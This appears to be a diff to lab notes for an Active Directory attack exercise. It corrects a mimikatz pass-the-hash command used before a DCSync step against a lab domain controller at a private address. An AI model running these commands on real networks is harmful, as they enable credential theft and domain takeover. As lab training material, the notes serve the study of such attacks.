@@ -216,7 +216,7 @@ ________________________________________________________________________________
 8) dcsync on domain controller
 > close both admin cmd windows (you dont need them anymore)
 > go to original mimikatz cmd (or open new one)
-> sekurlsa::pth /user:domad /domain:adlab.local ntlm:hash
+> sekurlsa::pth /user:domad /domain:adlab.local /ntlm:hash
 > dir \\192.168.56.10\c$
 > cd C:\temp\SysinternalsSuite
 > mimikatz
